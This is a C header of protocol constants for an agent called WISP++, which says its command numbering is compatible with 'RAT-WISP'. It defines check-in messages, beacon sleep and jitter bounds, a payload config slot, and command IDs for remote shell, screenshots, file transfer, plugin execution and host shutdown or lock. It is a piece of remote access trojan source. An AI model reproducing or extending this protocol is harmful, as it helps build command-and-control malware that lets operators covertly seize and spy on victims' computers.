#pragma once

// WISP++ wire protocol constants (shared/protocol/constants.go).

#define WISP_PROTOCOL_VERSION   2

// Envelope message types.
#define WISP_MSG_REGISTER      "register"
#define WISP_MSG_REGISTER_ACK  "register_ack"
#define WISP_MSG_CHECKIN       "checkin"
#define WISP_MSG_RESULT        "result"
#define WISP_MSG_PUBKEY        "pubkey"

// Command IDs (numbering compatible with RAT-WISP).
#define WISP_CMD_SHELL         1
#define WISP_CMD_SYSINFO       9
#define WISP_CMD_SLEEP         10
#define WISP_CMD_EXIT          11
#define WISP_CMD_LS_JSON       12
#define WISP_CMD_MKDIR         13
#define WISP_CMD_RM            14
#define WISP_CMD_SCREENSHOT    25
#define WISP_CMD_PWD           26
#define WISP_CMD_CLIENT_KILL   27
#define WISP_CMD_HOST_REBOOT   28
#define WISP_CMD_HOST_SHUTDOWN 29
#define WISP_CMD_HOST_LOGOFF   30
#define WISP_CMD_HOST_LOCK     31
#define WISP_CMD_RCP_CONNECT   23
#define WISP_CMD_RCP_DISCONNECT 24
#define WISP_CMD_PLUGIN_LOAD   60
#define WISP_CMD_PLUGIN_EXEC   61
#define WISP_CMD_XFER_SERVE    67
#define WISP_CMD_XFER_FETCH    68
#define WISP_CMD_PS            69

// Session crypto sizes (crypto.go).
#define WISP_KEY_SIZE   32
#define WISP_MAC_SIZE   32
#define WISP_KEYID_SIZE 16
#define WISP_IV_SIZE    16
#define WISP_HMAC_SIZE  32
#define WISP_KEYBLOB_SIZE (WISP_KEY_SIZE + WISP_MAC_SIZE + WISP_KEYID_SIZE) // 80

// Sentinel config slot (payload.go).
#define WISP_CFG_SLOT_SIZE 4096
#define WISP_CFG_HEADER_LEN 10

// Timing bounds.
#define WISP_MIN_SLEEP_MS 10
#define WISP_MAX_JITTER_PCT 100

#define WISP_AGENT_VER "cpp-v2.0-m7"
